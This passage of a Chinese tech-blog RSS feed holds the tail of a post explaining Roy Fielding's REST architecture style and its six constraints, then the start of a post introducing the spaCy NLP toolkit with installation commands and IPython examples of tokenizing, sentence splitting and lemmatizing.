他在提出REST架构风格的同时也在进行HTTP/1.1的设计，Roy Fielding在社区中&lt;a href=&quot;https://web.archive.org/web/20091111012314/http://tech.groups.yahoo.com/group/rest-discuss/message/6757&quot;&gt;介绍过REST的来历&lt;/a&gt;：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Throughout the HTTP standardization process, I was called on to defend the design choices of the Web.That is an extremely difficult  thing to do within a process that accepts proposals from anyone on a topic that was rapidly becoming the center of an entire industry. I had comments from well over 500 developers, many of whom were distinguished engineers with decades of experience, and I had to explain everything from the most abstract notions of Web interaction to the finest details of HTTP syntax.That process honed my model down to a core set of principles, properties, and constraints that are now called REST.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;可以这么说REST是Roy Fielding在设计HTTP/1.1过程中产生的感悟以及对Web的思考，然后他就把它写进了自己的博士论文。Roy Fielding除了是REST和HTTP的主要作者，还是大名鼎鼎的&lt;a href=&quot;https://en.wikipedia.org/wiki/Apache_HTTP_Server&quot;&gt;Apache HTTP 服务器&lt;/a&gt;的共同创始人。&lt;/p&gt;

&lt;p&gt;实际上来说REST不是一个具体的架构，而是一种架构风格：一个设计良好的Web应用应该是一个资源网络，把信息抽象成资源（名词），然后再通过操作（动词）去改变资源的状态，可以类比在数据库中对表进行CRUD操作。HTTP就是REST风格的协议系统。Web应用是基于HTTP的，所以要构建RESTful的Web Service，可以直接使用HTTP已经存在的方法（GET、POST、PUT、DELETE）。&lt;/p&gt;

&lt;p&gt;举个例子，比如我们有一个人的信息：id是1024，姓名是foo，年龄是33岁，这个信息存储于服务端，是一个资源，假设这个资源可以用/persons/1024来识别。&lt;/p&gt;

&lt;p&gt;可以对这个资源执行的操作包括：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /persons/1024 （获取资源）
POST /persons/1024 （更新资源）
PUT /persons/1024 （创建这个资源）
DELETE /persons/1024 （删除资源）
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;理解了REST的基本理念之后，我们来看看Representational state transfer这个词的具体含义，还是以上面的例子来说明：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;首先，这个资源的state是：{name: “foo”，age: 33}（可能以数据库或者缓存等形式存在于服务端）&lt;/li&gt;
  &lt;li&gt;之后，客户端请求这个资源之后，服务端会把资源的状态以一种表现形式（representation）生成出来，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON、XML、HTML等等&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;name:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;foo&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;关于对representation，Roy Fielding在论文上是这么定义的：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;REST components perform actions on a resource by using a representation to capture the current or intended state of that resource and transferring that representation between components. A representation is a sequence of bytes, plus representation metadata to describe those bytes. Other commonly used but less precise names for a representation include: document, file, and HTTP message entity, instance, or variant.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;最后，服务端把这个表现形式传递（transfer）给客户端&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这三步完整诠释了Representational state transfer这个词的含义。&lt;/p&gt;

&lt;p&gt;最后，让我们来看看RESTful架构的约束，一共有以下6个约束，违反任何一项约束都不能算作是RESTful。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Client-Server&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;client-server约束的原则是把用户端和服务端的关注点进行分离。这样用户端和服务端可以独立演化。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;无状态&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;客户端在进行请求的过程中，服务端不会存储任何客户端信息。每次请求客户端都需要包含所有的信息，包括会话状态，会话状态存储在客户端。会话状态在服务端可以转发给类似于数据库这类的服务，用来在一段时间内保持一个持久的状态，并且可以用来做认证。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;可缓存&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;客户端和任何中间服务都要可以缓存响应内容。响应报文必须指定自身是可缓存的，否则客户端可能会使用过期或者不准确的数据。管理良好的缓存能够部分或者完全消除客户端和服务端之间的交互，进一步提高扩展能力和性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;系统分层&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;客户端并不能说清它是直接连接到了最终服务器还是一个中间服务器。中间服务器可以通过负载均衡和分布式缓存来改善系统的扩展能力。并且也可以加强安全策略。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Code on demand (optional)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;服务端通过传输可执行的代码可以扩展或者定制客户端的行为。可以采用Java applets或者JavaScript等技术。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;统一接口
统一接口的约束是设计REST服务的基础。统一接口简化并且解耦了整个架构，这样整个架构的每个部分可以独立进化。统一接口的四个约束分别是：
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;资源识别&lt;/p&gt;

        &lt;p&gt;资源在请求过程中要可以识别，比如在基于web的REST系统中使用&lt;a href=&quot;https://en.wikipedia.org/wiki/Uniform_resource_identifier&quot;&gt;URI&lt;/a&gt;。资源本身在概念上是和返回给客户端的表示形式（representation）是分离的。比如，服务器可以把数据库中的资源以HTML、XML或者JSON等表现形式发送到客户端，但是这三个都不是资源在服务端内部的形式。&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;通过资源的表现形式来修改资源&lt;/p&gt;

        &lt;p&gt;当一个客户端得到一个资源的表现形式，其中也包含了很多元数据，客户端就有足够的信息可以来修改或者删除资源。&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;自描述消息&lt;/p&gt;

        &lt;p&gt;每个消息都包含足够的信息用来描述如何处理整个消息。比如，可以使用Internet media type（MIME类型）来指定用什么解释器来解析消息。&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;超媒体作为应用状态的引擎 (Hypermedia as the engine of application state，HATEOAS)&lt;/p&gt;

        &lt;p&gt;在访问了一个REST应用的初始URI（就像人类用户访问了一个网站的首页）之后，REST客户端应该可以使用服务端动态提供的链接来发现所有可用的操作和资源。当访问继续，服务端会返回包括超链接的文本，这些超链接指向当前可用的其他操作。客户端没有必要把REST服务的结构或者动态行为硬编码。&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section&quot;&gt;参考&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Representational_state_transfer&quot;&gt;https://en.wikipedia.org/wiki/Representational_state_transfer&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm&quot;&gt;http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/27785028&quot;&gt;REST 架构该怎么生动地理解？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

    （全文完）

	&lt;!-- disqus start --&gt;
	
	
	
	
	&lt;!-- disqus end --&gt;

	&lt;!-- related start --&gt;
	
	&lt;!-- related end --&gt;

</description>
        <pubDate>Mon, 14 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-11-14-what-is-rest.html-e03901700.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-11-14-what-is-rest.html-e03901700.html</guid>
        
        
        <category>weizhifeng</category>
        
      </item>
    
      <item>
        <title>自然语言处理工具包spaCy介绍</title>
        <description>

						&lt;p&gt;&lt;a href=&quot;https://spacy.io/&quot; target=&quot;_blank&quot;&gt;spaCy&lt;/a&gt; 是一个Python自然语言处理工具包，诞生于2014年年中，号称“Industrial-Strength Natural Language Processing in Python”，是具有工业级强度的Python NLP工具包。spaCy里大量使用了 &lt;a href=&quot;http://cython.org/&quot; target=&quot;_blank&quot;&gt;Cython&lt;/a&gt; 来提高相关模块的性能，这个区别于学术性质更浓的Python NLTK，因此具有了业界应用的实际价值。&lt;/p&gt;
&lt;p&gt;安装和编译 &lt;a href=&quot;https://github.com/explosion/spaCy&quot; target=&quot;_blank&quot;&gt;spaCy&lt;/a&gt; 比较方便，在ubuntu环境下，直接用pip安装即可：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container text default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;text codecolorer&quot;&gt;sudo apt-get install build-essential python-dev git&lt;br&gt;
sudo pip install -U spacy&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;不过安装完毕之后，需要下载相关的模型数据，以英文模型数据为例，可以用”all”参数下载所有的数据:&lt;/p&gt;
&lt;div class=&quot;codecolorer-container text default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;text codecolorer&quot;&gt;sudo python -m spacy.en.download all&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;或者可以分别下载相关的模型和用glove训练好的词向量数据：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;
&lt;span class=&quot;co1&quot;&gt;# 这个过程下载英文tokenizer，词性标注，句法分析，命名实体识别相关的模型&lt;/span&gt;&lt;br&gt;
python -m spacy.&lt;span class=&quot;me1&quot;&gt;en&lt;/span&gt;.&lt;span class=&quot;me1&quot;&gt;download&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;parser&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
&lt;span class=&quot;co1&quot;&gt;# 这个过程下载glove训练好的词向量数据&lt;/span&gt;&lt;br&gt;
python -m spacy.&lt;span class=&quot;me1&quot;&gt;en&lt;/span&gt;.&lt;span class=&quot;me1&quot;&gt;download&lt;/span&gt; glove&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;下载好的数据放在spacy安装目录下的data里，以我的ubuntu为例：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container text default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;text codecolorer&quot;&gt;textminer@textminer:/usr/local/lib/python2.7/dist-packages/spacy/data$ du -sh *&lt;br&gt;
776M    en-1.1.0&lt;br&gt;
774M    en_glove_cc_300_1m_vectors-1.0.0&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;进入到英文数据模型下：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container text default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;text codecolorer&quot;&gt;textminer@textminer:/usr/local/lib/python2.7/dist-packages/spacy/data/en-1.1.0$ du -sh *&lt;br&gt;
424M    deps&lt;br&gt;
8.0K    meta.json&lt;br&gt;
35M ner&lt;br&gt;
12M pos&lt;br&gt;
84K tokenizer&lt;br&gt;
300M    vocab&lt;br&gt;
6.3M    wordnet&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;可以用如下命令检查模型数据是否安装成功：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container text default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;text codecolorer&quot;&gt;textminer@textminer:~$ python -c &quot;import spacy; spacy.load(&#39;en&#39;); print(&#39;OK&#39;)&quot;&lt;br&gt;
OK&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;也可以用pytest进行测试：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container text default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;height:450px;&quot;&gt;&lt;div class=&quot;text codecolorer&quot;&gt;# 首先找到spacy的安装路径：&lt;br&gt;
python -c &quot;import os; import spacy; print(os.path.dirname(spacy.__file__))&quot;&lt;br&gt;
/usr/local/lib/python2.7/dist-packages/spacy&lt;br&gt;
&lt;br&gt;
# 再安装pytest:&lt;br&gt;
sudo python -m pip install -U pytest&lt;br&gt;
&lt;br&gt;
# 最后进行测试：&lt;br&gt;
python -m pytest /usr/local/lib/python2.7/dist-packages/spacy --vectors --model --slow&lt;br&gt;
============================= test session starts ==============================&lt;br&gt;
platform linux2 -- Python 2.7.12, pytest-3.0.4, py-1.4.31, pluggy-0.4.0&lt;br&gt;
rootdir: /usr/local/lib/python2.7/dist-packages/spacy, inifile: &lt;br&gt;
collected 318 items &lt;br&gt;
&lt;br&gt;
../../usr/local/lib/python2.7/dist-packages/spacy/tests/test_matcher.py ........&lt;br&gt;
../../usr/local/lib/python2.7/dist-packages/spacy/tests/matcher/test_entity_id.py ....&lt;br&gt;
../../usr/local/lib/python2.7/dist-packages/spacy/tests/matcher/test_matcher_bugfixes.py .....&lt;br&gt;
......&lt;br&gt;
../../usr/local/lib/python2.7/dist-packages/spacy/tests/vocab/test_vocab.py .......Xx&lt;br&gt;
../../usr/local/lib/python2.7/dist-packages/spacy/tests/website/test_api.py x...............&lt;br&gt;
../../usr/local/lib/python2.7/dist-packages/spacy/tests/website/test_home.py ............&lt;br&gt;
&lt;br&gt;
============== 310 passed, 5 xfailed, 3 xpassed in 53.95 seconds ===============&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;现在可以快速测试一下spaCy的相关功能，我们以英文数据为例，spaCy目前主要支持英文和德文，对其他语言的支持正在陆续加入：&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;textminer&lt;span class=&quot;sy0&quot;&gt;@&lt;/span&gt;textminer:&lt;span class=&quot;sy0&quot;&gt;~&lt;/span&gt;$ ipython&lt;br&gt;
Python 2.7.12 &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; Jul  &lt;span class=&quot;nu0&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;2016&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;15&lt;/span&gt;:&lt;span class=&quot;nu0&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;nu0&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; &lt;br&gt;
Type &lt;span class=&quot;st0&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;st0&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;st0&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; more information.&lt;br&gt;
&lt;br&gt;
&lt;span class=&quot;me1&quot;&gt;IPython&lt;/span&gt; 2.4.1 -- An enhanced Interactive Python.&lt;br&gt;
?         -&lt;span class=&quot;sy0&quot;&gt;&amp;gt;&lt;/span&gt; Introduction &lt;span class=&quot;kw1&quot;&gt;and&lt;/span&gt; overview of IPython&lt;span class=&quot;st0&quot;&gt;&#39;s features.&lt;br&gt;
%quickref -&amp;gt; Quick reference.&lt;br&gt;
help      -&amp;gt; Python&#39;&lt;/span&gt;s own &lt;span class=&quot;kw2&quot;&gt;help&lt;/span&gt; system.&lt;br&gt;
&lt;span class=&quot;kw2&quot;&gt;object&lt;/span&gt;?   -&lt;span class=&quot;sy0&quot;&gt;&amp;gt;&lt;/span&gt; Details about &lt;span class=&quot;st0&quot;&gt;&#39;object&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; use &lt;span class=&quot;st0&quot;&gt;&#39;object??&#39;&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; extra details.&lt;br&gt;
&lt;br&gt;
&lt;span class=&quot;me1&quot;&gt;In&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;import&lt;/span&gt; spacy          &lt;br&gt;
&lt;br&gt;
&lt;span class=&quot;co1&quot;&gt;# 加载英文模型数据，稍许等待&lt;/span&gt;&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: nlp &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; spacy.&lt;span class=&quot;me1&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&#39;en&#39;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Word tokenize功能，spaCy 1.2版本加了中文tokenize接口，基于&lt;a href=&quot;https://github.com/fxsjy/jieba&quot; target=&quot;_blank&quot;&gt;Jieba&lt;/a&gt;中文分词:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: test_doc &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; nlp&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;st0&quot;&gt;&quot;it&#39;s word tokenize test for spacy&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;            &lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;test_doc&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
it&lt;span class=&quot;st0&quot;&gt;&#39;s word tokenize test for spacy&lt;br&gt;
&lt;br&gt;
In [5]: for token in test_doc:                                          &lt;br&gt;
    print(token)&lt;br&gt;
   ...:     &lt;br&gt;
it&lt;br&gt;
&#39;&lt;/span&gt;s&lt;br&gt;
word&lt;br&gt;
&lt;span class=&quot;kw3&quot;&gt;tokenize&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;kw3&quot;&gt;test&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt;&lt;br&gt;
spacy&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;英文断句:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: test_doc &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; nlp&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;st0&quot;&gt;&#39;Natural language processing (NLP) deals with the application of computational models to text or speech data. Application areas within NLP include automatic (machine) translation between languages; dialogue systems, which allow a human to interact with a machine using natural language; and information extraction, where the goal is to transform unstructured text into structured (database) representations that can be searched and browsed in flexible ways. NLP technologies are having a dramatic impact on the way people interact with computers, on the way people interact with each other through the use of language, and on the way people access the vast amount of linguistic data now in electronic form. From a scientific viewpoint, NLP involves fundamental questions of how to structure formal models (for example statistical models) of natural language phenomena, and of how to design algorithms that implement these models.&#39;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; sent &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; test_doc.&lt;span class=&quot;me1&quot;&gt;sents&lt;/span&gt;:&lt;br&gt;
    &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;sent&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
   ...:     &lt;br&gt;
Natural language processing &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;NLP&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; deals &lt;span class=&quot;kw1&quot;&gt;with&lt;/span&gt; the application of computational models to text &lt;span class=&quot;kw1&quot;&gt;or&lt;/span&gt; speech data.&lt;br&gt;
&lt;span class=&quot;me1&quot;&gt;Application&lt;/span&gt; areas within NLP include automatic &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;machine&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; translation between languages&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt; dialogue systems&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; which allow a human to interact &lt;span class=&quot;kw1&quot;&gt;with&lt;/span&gt; a machine using natural language&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;and&lt;/span&gt; information extraction&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; where the goal &lt;span class=&quot;kw1&quot;&gt;is&lt;/span&gt; to transform unstructured text into structured &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;database&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; representations that can be searched &lt;span class=&quot;kw1&quot;&gt;and&lt;/span&gt; browsed &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; flexible ways.&lt;br&gt;
&lt;span class=&quot;me1&quot;&gt;NLP&lt;/span&gt; technologies are having a dramatic impact on the way people interact &lt;span class=&quot;kw1&quot;&gt;with&lt;/span&gt; computers&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; on the way people interact &lt;span class=&quot;kw1&quot;&gt;with&lt;/span&gt; each other through the use of language&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;and&lt;/span&gt; on the way people access the vast amount of linguistic data now &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; electronic form.&lt;br&gt;
&lt;span class=&quot;me1&quot;&gt;From&lt;/span&gt; a scientific viewpoint&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; NLP involves fundamental questions of how to structure formal models &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; example statistical models&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; of natural language phenomena&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;and&lt;/span&gt; of how to design algorithms that implement these models.&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;br&gt;
词干化（Lemmatize):&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;codecolorer-container python default&quot; style=&quot;overflow:auto;white-space:nowrap;width:620px;&quot;&gt;&lt;div class=&quot;python codecolorer&quot;&gt;In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: test_doc &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; nlp&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;st0&quot;&gt;&quot;you are best. it is lemmatize test for spacy. I love these books&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;br&gt;
In &lt;span class=&quot;br0&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nu0&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;]&lt;/span&gt;: &lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;in&lt;/span&gt; test_doc:                                                      &lt;br&gt;
    &lt;span class=&quot;kw1&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt;.&lt;span class=&quot;me1&quot;&gt;lemma_&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw3&quot;&gt;token&lt;/span&gt;.&lt;span class=&quot;me1&quot;&gt;lemma&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
   ...:     &lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;you&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;you&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;472&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;are&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;be&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;488&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;best&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;good&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;556&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;419&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;it&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;it&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;473&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw1&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; u&lt;span class=&quot;st0&quot;&gt;&#39;be&#39;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;488&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;br&gt;
